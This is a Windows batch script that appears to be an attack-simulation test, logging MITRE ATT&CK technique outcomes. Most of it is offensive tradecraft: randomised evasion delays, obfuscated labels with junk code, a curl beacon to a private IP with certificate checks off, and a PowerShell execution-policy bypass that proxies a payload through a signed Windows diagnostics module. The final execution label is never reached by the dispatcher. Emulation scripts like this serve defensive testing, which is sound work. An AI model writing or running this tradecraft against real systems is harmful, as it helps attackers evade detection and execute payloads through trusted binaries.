@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET sdnpqt=%APPDATA%\9246\9d3f6d15
SET zxmqp=https://10.0.0.49
SET wqlfgy=https://10.0.0.49/stage/2/icon.png?9246-10
SET mntgwl=ITZEL-S2BO
SET kfjwbc=10
SET hdlymc=winword.txt
SET pbsjql=9246

SET logvar=%APPDATA%\!kfjwbc!\macula-simulations.log
SET staten=0

echo [!DATE! !TIME!][DEBUG][!mntgwl!]: script_start=delay>> "!logvar!" 2>nul
ping -n 45 127.0.0.1 >nul
SET /A dly=%RANDOM% %% 20 + 10
timeout /t !dly! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!mntgwl!]: delay_complete=!dly!s>> "!logvar!" 2>nul

GOTO entry_plbxs

:junk_mnvdl
EXIT

:dispatch_fqkcy
IF !staten!==0 GOTO init_hgjfk
IF !staten!==17 GOTO heartbeat_zxcvm
IF !staten!==42 GOTO prepare_kdntm
IF !staten!==99 GOTO END

:dead_wqpls
SET fake=never_executed
GOTO END

:init_hgjfk
echo [!DATE! !TIME!][DEBUG][!mntgwl!]: vars_set=complete>> "!logvar!" 2>nul
SET staten=17
GOTO dispatch_fqkcy

:junk_rtybn
REM Dead code block

:entry_plbxs
SET staten=0
GOTO dispatch_fqkcy

:dead_xcvfg
GOTO END

:heartbeat_zxcvm
echo [!DATE! !TIME!][DEBUG][!mntgwl!]: heartbeat_start=!wqlfgy!>> "!logvar!" 2>nul
curl -k -s -o nul "!wqlfgy!"
SET hbres=!errorlevel!
IF !hbres!==0 (
    SET ttp_res=1
    SET ttp_err=
) ELSE (
    SET ttp_res=0
    SET ttp_err=curl_failed_!hbres!
)
echo [!DATE! !TIME!][!mntgwl!]: !kfjwbc!-!pbsjql!-T1218|Signed_Script_Proxy_Execution=!ttp_res!:!ttp_err!>> "!logvar!" 2>nul
echo [!DATE! !TIME!][DEBUG][!mntgwl!]: heartbeat_end=!hbres!>> "!logvar!" 2>nul
CHOICE /C Y /N /D Y /T 8 >nul
SET staten=42
GOTO dispatch_fqkcy

:junk_qazws
GOTO END

:prepare_kdntm
SET netexec=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\UtilityFunctions.ps1
echo [!DATE! !TIME!][DEBUG][!mntgwl!]: exec_prepare=!netexec!>> "!logvar!" 2>nul
timeout /t 12 /nobreak >nul
SET staten=99
GOTO dispatch_fqkcy

:jump_lkjhg
REM Unreachable

:dead_poiuy
EXIT

:final_exec
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module !netexec!; RegSnapin !sdnpqt!\!hdlymc!;[Program.Class]::Dale()"
SET execres=!errorlevel!
IF !execres!==0 (
    SET ttp_res=1
    SET ttp_err=
) ELSE (
    SET ttp_res=0
    SET ttp_err=powershell_failed_!execres!
)
echo [!DATE! !TIME!][!mntgwl!]: !kfjwbc!-!pbsjql!-T1218.011|Regsvcs/Regasm=!ttp_res!:!ttp_err!>> "!logvar!" 2>nul
echo [!DATE! !TIME!][DEBUG][!mntgwl!]: execution_end=!execres!>> "!logvar!" 2>nul
GOTO END

:END